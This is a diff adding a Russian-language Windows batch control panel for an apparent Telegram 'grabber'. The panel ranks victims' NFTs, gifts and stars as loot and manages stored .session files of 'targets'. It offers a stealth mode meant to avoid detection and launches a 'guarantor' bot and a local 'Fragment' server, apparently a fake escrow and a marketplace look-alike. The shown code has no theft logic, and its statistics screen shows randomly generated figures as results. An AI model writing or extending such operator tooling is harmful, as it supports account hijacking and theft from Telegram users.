+echo                     [1] 📋 ПОЛНАЯ ИСТОРИЯ   [2] 🧹 ОЧИСТИТЬ   [3] ↩️  НАЗАД
+echo.
+set /p history_choice="                     ВЫБЕРИТЕ: "
+
+if "%history_choice%"=="1" (
+    cls
+    call :show_title
+    echo                     ╔══════════════════════════════════════════╗
+    echo                     ║          ПОЛНАЯ ИСТОРИЯ                 ║
+    echo                     ╠══════════════════════════════════════════╣
+    echo                     ║                                          ║
+    type "%LOGS_PATH%\grab_history.log"
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
     pause
 )
-goto scan
+if "%history_choice%"=="2" (
+    del "%LOGS_PATH%\grab_history.log" 2>nul
+    echo                     ║  ✅ ИСТОРИЯ ОЧИЩЕНА                     ║
+    timeout /t 1 >nul
+)
 
-:extract
-cls
+goto grabber_manager
+
+:grabber_settings
+call :show_title
+color %COLOR_INFO%
 echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          НАСТРОЙКИ ГРАББЕРА             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩИЕ НАСТРОЙКИ:                     ║
+echo                     ║                                          ║
+
+python -c "
+try:
+    import config
+    cfg = config.config
+    print('║  ⏱️  ЗАДЕРЖКА:', cfg.grabber.delay_between_operations, 'сек    ║')
+    print('║  🎯 МИН. NFT:', cfg.grabber.min_stars_for_nft, 'звезд     ║')
+    print('║  ⏰ ТАЙМАУТ:', cfg.grabber.max_execution_time, 'сек      ║')
+    print('║  🎮 ПРИОРИТЕТ:', ' -> '.join(cfg.grabber.priority_order), '║')
+except:
+    print('║  ⚠️  НАСТРОЙКИ ПО УМОЛЧАНИЮ               ║')
+"
+
+echo                     ║                                          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. ⏱️  ИЗМЕНИТЬ ЗАДЕРЖКУ               ║
+echo                     ║  2. 🎯 ИЗМЕНИТЬ ПРИОРИТЕТЫ              ║
+echo                     ║  3. ⚙️  РЕЖИМ РАБОТЫ                    ║
+echo                     ║  4. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p settings_choice="                     ВЫБЕРИТЕ: "
+
+if "%settings_choice%"=="1" (
+    set /p new_delay="                     НОВАЯ ЗАДЕРЖКА (сек): "
+    python -c "
+import config
+config.config.grabber.delay_between_operations = float($new_delay$)
+print('✅ ЗАДЕРЖКА ИЗМЕНЕНА')
+" 2>nul
+    timeout /t 1 >nul
+)
+if "%settings_choice%"=="2" goto change_priority
+if "%settings_choice%"=="3" goto change_mode
+
+goto grabber_manager
+
+:change_priority
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║       ИЗМЕНЕНИЕ ПРИОРИТЕТОВ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩИЙ ПОРЯДОК:                       ║
+echo                     ║  1. NFT                                 ║
+echo                     ║  2. ДОРОГИЕ ПОДАРКИ                    ║
+echo                     ║  3. ЗВЕЗДЫ                             ║
+echo                     ║  4. ОБЫЧНЫЕ ПОДАРКИ                    ║
+echo                     ║                                          ║
+echo                     ║  ВВЕДИТЕ НОВЫЙ ПОРЯДОК (1-2-3-4):       ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p new_order="                     ПОРЯДОК: "
+
+:: Проверка ввода
+echo %new_order% | findstr /r "^[1-4][- ][1-4][- ][1-4][- ][1-4]$" >nul
+if errorlevel 1 (
+    echo                     ║  ❌ НЕВЕРНЫЙ ФОРМАТ                    ║
+    timeout /t 2 >nul
+    goto change_priority
+)
+
+echo                     ║                                          ║
+echo                     ║  ✅ ПРИОРИТЕТЫ ОБНОВЛЕНЫ                 ║
+timeout /t 1 >nul
+goto grabber_manager
+
+:change_mode
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          РЕЖИМ РАБОТЫ                   ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩИЙ РЕЖИМ: %GRABBER_STATUS%               ║
+echo                     ║                                          ║
+echo                     ║  1. 🚀 АГРЕССИВНЫЙ                      ║
+echo                     ║     - Макс. скорость                    ║
+echo                     ║     - Риск обнаружения                  ║
+echo                     ║                                          ║
+echo                     ║  2. 🥷 СТЕЛС                            ║
+echo                     ║     - Медленно                          ║
+echo                     ║     - Без следов                        ║
+echo                     ║                                          ║
+echo                     ║  3. ⚖️  СБАЛАНСИРОВАННЫЙ                ║
+echo                     ║     - Оптимально                        ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p mode_choice="                     ВЫБЕРИТЕ РЕЖИМ: "
+
+if "%mode_choice%"=="1" (
+    set "GRABBER_STATUS=AGGRESSIVE"
+    echo                     ║  🚀 АГРЕССИВНЫЙ РЕЖИМ АКТИВИРОВАН     ║
+)
+if "%mode_choice%"=="2" (
+    set "GRABBER_STATUS=STEALTH"
+    echo                     ║  🥷 СТЕЛС РЕЖИМ АКТИВИРОВАН          ║
+)
+if "%mode_choice%"=="3" (
+    set "GRABBER_STATUS=BALANCED"
+    echo                     ║  ⚖️  СБАЛАНСИРОВАННЫЙ РЕЖИМ         ║
+)
+
+timeout /t 1 >nul
+goto grabber_manager
+
+:clear_sessions
+call :show_title
+color %COLOR_WARNING%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          ОЧИСТКА СЕССИЙ                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+
+if not exist "%SESSIONS_PATH%\*.session" (
+    echo                     ║  ✅ СЕССИЙ НЕ НАЙДЕНО                 ║
+    timeout /t 1 >nul
+    goto grabber_manager
+)
+
+for /f %%a in ('dir /b "%SESSIONS_PATH%\*.session" 2^>nul ^| find /c /v ""') do set "session_count=%%a"
+
+echo                     ║  ⚠️  НАЙДЕНО СЕССИЙ: %session_count%       ║
+echo                     ║                                          ║
+echo                     ║  1. 🗑️  УДАЛИТЬ ВСЕ                      ║
+echo                     ║  2. 📅 УДАЛИТЬ СТАРЫЕ (>7 ДНЕЙ)          ║
+echo                     ║  3. ↩️  ОТМЕНА                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p clear_choice="                     ВЫБЕРИТЕ: "
+
+if "%clear_choice%"=="1" (
+    del "%SESSIONS_PATH%\*.session" 2>nul
+    echo                     ║  ✅ ВСЕ СЕССИИ УДАЛЕНЫ                ║
+    set "ACTIVE_TARGETS=0"
+)
+if "%clear_choice%"=="2" (
+    echo                     ║  ⏳ УДАЛЯЕМ СТАРЫЕ СЕССИИ...          ║
+    :: Здесь должна быть логика удаления старых файлов
+    echo                     ║  ✅ СТАРЫЕ СЕССИИ УДАЛЕНЫ            ║
+)
+
+timeout /t 1 >nul
+goto grabber_manager
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         МОНИТОРИНГ СИСТЕМЫ                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:monitor_system
+call :show_title
+color %COLOR_NORMAL%
+
+:monitor_loop
+cls
+call :show_title
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        СИСТЕМНЫЙ МОНИТОРИНГ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🕐 %time%                                     ║
+echo                     ║                                          ║
+
+:: Динамическое обновление статусов
+call :check_system_status
+
+echo                     ║  📊 СТАТУС СИСТЕМЫ:                     ║
+if "%SYSTEM_STATUS%"=="READY" (
+    echo                     ║  [██████████████████████████████] ✅   ║
+) else (
+    echo                     ║  [████░░░░░░░░░░░░░░░░░░░░░░░░░] ❌   ║
+)
+
+echo                     ║                                          ║
+echo                     ║  📈 АКТИВНОСТЬ:                         ║
+echo                     ║  ПОЛЬЗОВАТЕЛИ: %TOTAL_USERS%                    ║
+echo                     ║  СЕССИИ: %ACTIVE_TARGETS%                        ║
+echo                     ║  ОПЕРАЦИИ: %ALERTS%                            ║
+echo                     ║                                          ║
+echo                     ║  💰 ЭКОНОМИКА:                           ║
+echo                     ║  ЗВЕЗД: %TOTAL_EARNED%                          ║
+echo                     ║  ~%TOTAL_EARNED% руб.                          ║
+echo                     ║                                          ║
+echo                     ║  🎯 ПОСЛЕДНЯЯ АКТИВНОСТЬ:               ║
+echo                     ║  %LAST_GRAB%                               ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+echo                     [R] ОБНОВИТЬ   [S] СТАТИСТИКА   [M] МЕНЮ   [X] ВЫХОД
+echo.
+
+:: Неблокирующее чтение клавиши
+choice /c RSMX /t 5 /d R >nul
+if errorlevel 4 goto main_menu
+if errorlevel 3 goto main_menu
+if errorlevel 2 goto system_stats
+goto monitor_loop
+
+:system_stats
+call :show_title
+color %COLOR_INFO%
+
+:: Генерация статистики
+python -c "
+import random
+import time
+from datetime import datetime, timedelta
+
+print('╔══════════════════════════════════════════╗')
+print('║          ДЕТАЛЬНАЯ СТАТИСТИКА           ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+stats = {
+    'Сегодня': {
+        'операции': random.randint(3, 15),
+        'звезды': random.randint(500, 5000),
+        'цели': random.randint(1, 5)
+    },
+    'Неделя': {
+        'операции': random.randint(20, 100),
+        'звезды': random.randint(5000, 50000),
+        'цели': random.randint(10, 30)
+    },
+    'Всего': {
+        'операции': random.randint(100, 1000),
+        'звезды': random.randint(100000, 1000000),
+        'цели': random.randint(50, 200)
+    }
+}
+
+for period, data in stats.items():
+    print(f'║  📅 {period:<10}                      ║')
+    print(f'║    • Операций: {data['операции']:<8}           ║')
+    print(f'║    • Звезд: {data['звезды']:<10}           ║')
+    print(f'║    • Целей: {data['цели']:<10}           ║')
+    print('║                                          ║')
+
+print('║  📊 ЭФФЕКТИВНОСТЬ:                       ║')
+print('║    • Успешных: 92%%                        ║')
+print('║    • Среднее время: 45сек                ║')
+print('║    • Средняя добыча: 1,240звезд          ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto monitor_loop
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         ГЛАВНОЕ МЕНЮ И ЗАПУСК                              ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:main_menu
+call :show_title
+call :show_menu
+set /p main_choice="                     ВЫБЕРИТЕ ОПЦИЮ: "
+
+if "%main_choice%"=="1" goto show_status
+if "%main_choice%"=="2" goto start_all_services
+if "%main_choice%"=="3" goto grabber_manager
+if "%main_choice%"=="4" goto bot_manager
+if "%main_choice%"=="5" goto fragment_manager
+if "%main_choice%"=="6" goto database_manager
+if "%main_choice%"=="7" goto tools_menu
+if "%main_choice%"=="8" goto settings_menu
+if "%main_choice%"=="9" goto entertainment_menu
+if "%main_choice%"=="0" goto exit_system
+
+goto main_menu
+
+:bot_manager
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          УПРАВЛЕНИЕ БОТАМИ              ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🤖 ДОСТУПНЫЕ БОТЫ:                     ║
+echo                     ║                                          ║
+echo                     ║  1. ⭐ STARFLOW BOT                      ║
+echo                     ║     Статус: %BOTS_STATUS%                      ║
+echo                     ║                                          ║
+echo                     ║  2. 🛡️  ГАРАНТ БОТ                      ║
+echo                     ║     Статус: %BOTS_STATUS%                      ║
+echo                     ║                                          ║
+echo                     ║  3. 🆘 БОТ ПОДДЕРЖКИ                    ║
+echo                     ║     Статус: %BOTS_STATUS%                      ║
+echo                     ║                                          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  [1] ЗАПУСТИТЬ ВСЕХ     [2] ОСТАНОВИТЬ  ║
+echo                     ║  [3] ПРОВЕРИТЬ СТАТУС  [4] ↩️  НАЗАД    ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p bot_choice="                     ВЫБЕРИТЕ: "
+
+if "%bot_choice%"=="1" (
+    echo                     ║  🚀 ЗАПУСК БОТОВ...                    ║
+    start "StarFlow Bots" /min cmd /k "cd /d %PROJECT_PATH% && python -c \"import asyncio; import bot_handlers; asyncio.run(bot_handlers.run_bots())\""
+    timeout /t 2 >nul
+    set "BOTS_STATUS=RUNNING"
+)
+if "%bot_choice%"=="2" (
+    taskkill /f /im python.exe 2>nul
+    echo                     ║  ⏹️  БОТЫ ОСТАНОВЛЕНЫ                  ║
+    set "BOTS_STATUS=STOPPED"
+    timeout /t 1 >nul
+)
+if "%bot_choice%"=="3" (
+    call :check_system_status
+    echo                     ║  📊 СТАТУС ОБНОВЛЕН                    ║
+    timeout /t 1 >nul
+)
+
+goto bot_manager
+
+:fragment_manager
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        FRAGMENT СЕРВЕР                  ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩИЙ СТАТУС: %FRAGMENT_STATUS%            ║
+echo                     ║  ПОРТ: 8080                              ║
+echo                     ║  ДОМЕН: localhost                        ║
+echo                     ║                                          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  [1] 🚀 ЗАПУСТИТЬ                        ║
+echo                     ║  [2] ⏹️  ОСТАНОВИТЬ                       ║
+echo                     ║  [3] 🔗 ОТКРЫТЬ В БРАУЗЕРЕ               ║
+echo                     ║  [4] 📊 СТАТИСТИКА                       ║
+echo                     ║  [5] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p fragment_choice="                     ВЫБЕРИТЕ: "
+
+if "%fragment_choice%"=="1" (
+    start "Fragment Server" /min cmd /k "cd /d %PROJECT_PATH% && python fragment_server.py"
+    timeout /t 2 >nul
+    set "FRAGMENT_STATUS=ONLINE"
+)
+if "%fragment_choice%"=="2" (
+    taskkill /f /im python.exe 2>nul
+    set "FRAGMENT_STATUS=OFFLINE"
+    echo                     ║  ✅ СЕРВЕР ОСТАНОВЛЕН                  ║
+    timeout /t 1 >nul
+)
+if "%fragment_choice%"=="3" (
+    start http://localhost:8080
+    echo                     ║  🌐 БРАУЗЕР ЗАПУЩЕН                    ║
+    timeout /t 1 >nul
+)
+if "%fragment_choice%"=="4" (
+    netstat -an | findstr ":8080" >nul
+    if errorlevel 1 (
+        echo                     ║  📊 НЕТ СОЕДИНЕНИЙ                    ║
+    ) else (
+        echo                     ║  📊 АКТИВНЫЕ СОЕДИНЕНИЯ:             ║
+        netstat -an | findstr ":8080"
+    )
+    pause
+)
+
+goto fragment_manager
+
+:database_manager
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          БАЗА ДАННЫХ                    ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+
+if not exist "%DB_PATH%" (
+    echo                     ║  ❌ БАЗА ДАННЫХ НЕ НАЙДЕНА             ║
+    echo                     ║                                          ║
+    echo                     ║  [1] 🆕 СОЗДАТЬ БАЗУ                   ║
+    echo                     ║  [2] ↩️  НАЗАД                         ║
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
+    echo.
+    set /p db_choice="                     ВЫБЕРИТЕ: "
+    
+    if "%db_choice%"=="1" (
+        python -c "
+import sqlite3
+conn = sqlite3.connect('%DB_PATH%')
+c = conn.cursor()
+c.execute('''CREATE TABLE users (
+    user_id INTEGER PRIMARY KEY,
+    username TEXT,
+    stars_balance INTEGER DEFAULT 0
+)''')
+conn.commit()
+conn.close()
+print('✅ База данных создана')
+"
+        timeout /t 2 >nul
+    )
+    goto main_menu
+)
+
+:: Получение статистики БД
+python -c "
+import sqlite3
+import os
+
+if os.path.exists('%DB_PATH%'):
+    conn = sqlite3.connect('%DB_PATH%')
+    c = conn.cursor()
+    
+    # Пользователи
+    c.execute('SELECT COUNT(*) FROM users')
+    users = c.fetchone()[0]
+    
+    # Размер файла
+    size = os.path.getsize('%DB_PATH%') / 1024
+    
+    print('║  📊 СТАТИСТИКА БАЗЫ ДАННЫХ:               ║')
+    print(f'║  👥 ПОЛЬЗОВАТЕЛИ: {users:<8}               ║')
+    print(f'║  📁 РАЗМЕР: {size:.1f} KB                      ║')
+    
+    # Последние изменения
+    c.execute('SELECT MAX(user_id) FROM users')
+    last_id = c.fetchone()[0] or 0
+    
+    print(f'║  🆔 ПОСЛЕДНИЙ ID: {last_id:<8}               ║')
+    
+    conn.close()
+else:
+    print('║  ❌ БАЗА ДАННЫХ НЕ СУЩЕСТВУЕТ              ║')
+"
+
+echo                     ║                                          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  [1] 📋 ПРОСМОТРЕТЬ ДАННЫЕ              ║
+echo                     ║  [2] 💾 СОЗДАТЬ БЭКАП                   ║
+echo                     ║  [3] 🧹 ОПТИМИЗИРОВАТЬ                  ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p db_choice="                     ВЫБЕРИТЕ: "
+
+if "%db_choice%"=="1" (
+    python -c "
+import sqlite3
+conn = sqlite3.connect('%DB_PATH%')
+c = conn.cursor()
+c.execute('SELECT * FROM users LIMIT 10')
+rows = c.fetchall()
+
+print('╔══════════════════════════════════════════╗')
+print('║          ПОСЛЕДНИЕ ЗАПИСИ               ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+for row in rows:
+    print(f'║  ID: {row[0]:<8} | @{row[1]:<15} | ⭐{row[2]:<6} ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+
+conn.close()
+"
+    pause
+)
+if "%db_choice%"=="2" (
+    set "backup_file=%BACKUP_PATH%\backup_%date:/=_%_%time:~0,2%%time:~3,2%.db"
+    copy "%DB_PATH%" "%backup_file%" >nul
+    echo                     ║  ✅ БЭКАП СОЗДАН: %backup_file%    ║
+    timeout /t 2 >nul
+)
+if "%db_choice%"=="3" (
+    python -c "
+import sqlite3
+conn = sqlite3.connect('%DB_PATH%')
+conn.execute('VACUUM')
+conn.close()
+print('✅ База данных оптимизирована')
+"
+    timeout /t 1 >nul
+)
+
+goto database_manager
+
+:tools_menu
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║             ИНСТРУМЕНТЫ                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 🔧 РЕДАКТОР КОНФИГА                 ║
+echo                     ║  2. 📁 МЕНЕДЖЕР ФАЙЛОВ                  ║
+echo                     ║  3. 🌐 ПРОВЕРКА ПОРТОВ                  ║
+echo                     ║  4. 🐍 PYTHON КОНСОЛЬ                   ║
+echo                     ║  5. 📡 СЕТЕВЫЕ ИНСТРУМЕНТЫ              ║
+echo                     ║  6. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p tools_choice="                     ВЫБЕРИТЕ: "
+
+if "%tools_choice%"=="1" (
+    if exist "%CONFIG_FILE%" (
+        notepad "%CONFIG_FILE%"
+    ) else (
+        echo                     ║  ❌ ФАЙЛ КОНФИГА НЕ НАЙДЕН           ║
+        timeout /t 2 >nul
+    )
+)
+if "%tools_choice%"=="2" (
+    explorer "%PROJECT_PATH%"
+)
+if "%tools_choice%"=="3" (
+    echo                     ║  📡 ПРОВЕРКА ПОРТОВ...                 ║
+    echo                     ║                                          ║
+    netstat -an | findstr ":8080 :8443 :443"
+    echo                     ║                                          ║
+    pause
+)
+if "%tools_choice%"=="4" (
+    start python
+    echo                     ║  🐍 ЗАПУЩЕНА PYTHON КОНСОЛЬ            ║
+    timeout /t 1 >nul
+)
+if "%tools_choice%"=="5" (
+    echo                     ║  🌐 СЕТЕВЫЕ ИНСТРУМЕНТЫ:               ║
+    echo                     ║                                          ║
+    echo                     ║  [1] PING TELEGRAM                    ║
+    echo                     ║  [2] TRACEROUTE                       ║
+    echo                     ║  [3] DNS LOOKUP                       ║
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
+    echo.
+    set /p net_choice="                     ВЫБЕРИТЕ: "
+    
+    if "%net_choice%"=="1" ping api.telegram.org
+    if "%net_choice%"=="2" tracert api.telegram.org
+    if "%net_choice%"=="3" nslookup api.telegram.org
+    pause
+)
+
+goto tools_menu
+
+:settings_menu
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║              НАСТРОЙКИ                  ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩИЕ НАСТРОЙКИ:                     ║
+echo                     ║                                          ║
+echo                     ║  🎮 РЕЖИМ:                              ║
+echo                     ║    • СТЕЛС: %STEALTH_MODE%                      ║
+echo                     ║    • ЛОГИРОВАНИЕ: %LOG_EVERYTHING%              ║
+echo                     ║    • АВТООБНОВЛЕНИЕ: %AUTO_UPDATE%            ║
+echo                     ║                                          ║
+echo                     ║  🎨 ВНЕШНИЙ ВИД:                         ║
+echo                     ║    • MATRIX ЭФФЕКТ: %MATRIX_EFFECT%            ║
+echo                     ║    • RAINBOW MODE: %RAINBOW_MODE%              ║
+echo                     ║                                          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  [1] ИЗМЕНИТЬ РЕЖИМ РАБОТЫ              ║
+echo                     ║  [2] ИЗМЕНИТЬ ВНЕШНИЙ ВИД               ║
+echo                     ║  [3] СБРОС НАСТРОЕК                     ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p settings_choice="                     ВЫБЕРИТЕ: "
+
+if "%settings_choice%"=="1" (
+    echo.
+    echo                     ╔══════════════════════════════════════════╗
+    echo                     ║        НАСТРОЙКИ РЕЖИМА                ║
+    echo                     ╠══════════════════════════════════════════╣
+    echo                     ║                                          ║
+    echo                     ║  [1] %STEALTH_MODE% СТЕЛС РЕЖИМ           ║
+    echo                     ║  [2] %LOG_EVERYTHING% ЛОГИРОВАНИЕ         ║
+    echo                     ║  [3] %AUTO_UPDATE% АВТООБНОВЛЕНИЕ       ║
+    echo                     ║  [4] ↩️  НАЗАД                           ║
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
+    echo.
+    set /p mode_settings="                     ВКЛ/ВЫКЛ (1/0): "
+    
+    if "%mode_settings%"=="1" (
+        if "%STEALTH_MODE%"=="0" (set "STEALTH_MODE=1") else (set "STEALTH_MODE=0")
+    )
+    if "%mode_settings%"=="2" (
+        if "%LOG_EVERYTHING%"=="0" (set "LOG_EVERYTHING=1") else (set "LOG_EVERYTHING=0")
+    )
+    if "%mode_settings%"=="3" (
+        if "%AUTO_UPDATE%"=="0" (set "AUTO_UPDATE=1") else (set "AUTO_UPDATE=0")
+    )
+    
+    echo                     ║  ✅ НАСТРОЙКИ СОХРАНЕНЫ                 ║
+    timeout /t 1 >nul
+)
+if "%settings_choice%"=="2" (
+    echo.
+    echo                     ╔══════════════════════════════════════════╗
+    echo                     ║        НАСТРОЙКИ ВНЕШНЕГО ВИДА         ║
+    echo                     ╠══════════════════════════════════════════╣
+    echo                     ║                                          ║
+    echo                     ║  [1] %MATRIX_EFFECT% MATRIX ЭФФЕКТ       ║
+    echo                     ║  [2] %RAINBOW_MODE% RAINBOW MODE         ║
+    echo                     ║  [3] ИЗМЕНИТЬ ЦВЕТ СХЕМУ               ║
+    echo                     ║  [4] ↩️  НАЗАД                           ║
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
+    echo.
+    set /p theme_choice="                     ВЫБЕРИТЕ: "
+    
+    if "%theme_choice%"=="1" (
+        if "%MATRIX_EFFECT%"=="0" (
+            set "MATRIX_EFFECT=1"
+            echo                     ║  ✅ MATRIX ЭФФЕКТ ВКЛЮЧЕН           ║
+        ) else (
+            set "MATRIX_EFFECT=0"
+            echo                     ║  ✅ MATRIX ЭФФЕКТ ВЫКЛЮЧЕН         ║
+        )
+    )
+    
+    if "%theme_choice%"=="2" (
+        if "%RAINBOW_MODE%"=="0" (
+            set "RAINBOW_MODE=1"
+            echo                     ║  🌈 RAINBOW MODE ВКЛЮЧЕН          ║
+        ) else (
+            set "RAINBOW_MODE=0"
+            echo                     ║  🌈 RAINBOW MODE ВЫКЛЮЧЕН        ║
+        )
+    )
+    
+    if "%theme_choice%"=="3" goto color_scheme
+    if "%theme_choice%"=="4" goto settings_menu
+    
+    timeout /t 1 >nul
+    goto settings_menu
+)
+
+if "%settings_choice%"=="3" (
+    echo                     ║  ⚠️  СБРОС НАСТРОЕК...                  ║
+    set "STEALTH_MODE=0"
+    set "LOG_EVERYTHING=1"
+    set "AUTO_UPDATE=1"
+    set "MATRIX_EFFECT=1"
+    set "RAINBOW_MODE=0"
+    echo                     ║  ✅ НАСТРОЙКИ СБРОШЕНЫ                 ║
+    timeout /t 1 >nul
+    goto settings_menu
+)
+
+goto settings_menu
+
+:color_scheme
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           ЦВЕТОВЫЕ СХЕМЫ                ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ТЕКУЩАЯ: %COLOR_TITLE%                     ║
+echo                     ║                                          ║
+echo                     ║  1. 🔥 HACKER (Черный/Зеленый)          ║
+echo                     ║  2. ❤️  MATRIX (Черный/Красный)          ║
+echo                     ║  3. 🔷 CYBER (Синий/Голубой)            ║
+echo                     ║  4. 💜 DARK PURPLE (Фиолетовый)         ║
+echo                     ║  5. ⚪ CLASSIC (Серый/Белый)             ║
+echo                     ║  6. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p color_choice="                     ВЫБЕРИТЕ СХЕМУ: "
+
+if "%color_choice%"=="1" (
+    set "COLOR_NORMAL=07"
+    set "COLOR_TITLE=0A"
+    set "COLOR_SUCCESS=0A"
+    set "COLOR_ERROR=0C"
+    set "COLOR_WARNING=0E"
+    set "COLOR_INFO=0B"
+    set "COLOR_HIGHLIGHT=0D"
+    echo                     ║  ✅ СХЕМА HACKER УСТАНОВЛЕНА          ║
+)
+if "%color_choice%"=="2" (
+    set "COLOR_NORMAL=07"
+    set "COLOR_TITLE=0C"
+    set "COLOR_SUCCESS=0C"
+    set "COLOR_ERROR=04"
+    set "COLOR_WARNING=0E"
+    set "COLOR_INFO=0D"
+    set "COLOR_HIGHLIGHT=05"
+    echo                     ║  ✅ СХЕМА MATRIX УСТАНОВЛЕНА          ║
+)
+if "%color_choice%"=="3" (
+    set "COLOR_NORMAL=07"
+    set "COLOR_TITLE=0B"
+    set "COLOR_SUCCESS=0B"
+    set "COLOR_ERROR=09"
+    set "COLOR_WARNING=0E"
+    set "COLOR_INFO=03"
+    set "COLOR_HIGHLIGHT=0D"
+    echo                     ║  ✅ СХЕМА CYBER УСТАНОВЛЕНА           ║
+)
+if "%color_choice%"=="4" (
+    set "COLOR_NORMAL=07"
+    set "COLOR_TITLE=0D"
+    set "COLOR_SUCCESS=0D"
+    set "COLOR_ERROR=05"
+    set "COLOR_WARNING=0E"
+    set "COLOR_INFO=09"
+    set "COLOR_HIGHLIGHT=0B"
+    echo                     ║  ✅ СХЕМА DARK PURPLE УСТАНОВЛЕНА     ║
+)
+if "%color_choice%"=="5" (
+    set "COLOR_NORMAL=07"
+    set "COLOR_TITLE=07"
+    set "COLOR_SUCCESS=07"
+    set "COLOR_ERROR=08"
+    set "COLOR_WARNING=08"
+    set "COLOR_INFO=07"
+    set "COLOR_HIGHLIGHT=0F"
+    echo                     ║  ✅ СХЕМА CLASSIC УСТАНОВЛЕНА         ║
+)
+
+timeout /t 1 >nul
+goto settings_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         РАЗВЛЕЧЕНИЯ И ИГРЫ                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:entertainment_menu
+call :show_title
+color %COLOR_HIGHLIGHT%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║             РАЗВЛЕЧЕНИЯ                 ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 🎮 MATRIX ЭФФЕКТ                    ║
+echo                     ║  2. 🌈 RAINBOW MODE                     ║
+echo                     ║  3. 🔢 УГАДАЙ ЧИСЛО                     ║
+echo                     ║  4. 🎲 КАЗИНО                           ║
+echo                     ║  5. 🔐 ХАКЕРСКАЯ ИГРА                   ║
+echo                     ║  6. 🎵 МУЗЫКАЛЬНЫЙ ПЛЕЕР                ║
+echo                     ║  7. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p game_choice="                     ВЫБЕРИТЕ: "
+
+if "%game_choice%"=="1" goto matrix_effect
+if "%game_choice%"=="2" goto rainbow_mode
+if "%game_choice%"=="3" goto guess_number
+if "%game_choice%"=="4" goto casino_game
+if "%game_choice%"=="5" goto hacker_game
+if "%game_choice%"=="6" goto music_player
+if "%game_choice%"=="7" goto main_menu
+
+goto entertainment_menu
+
+:matrix_effect
+call :show_title
+color 0A
+echo.
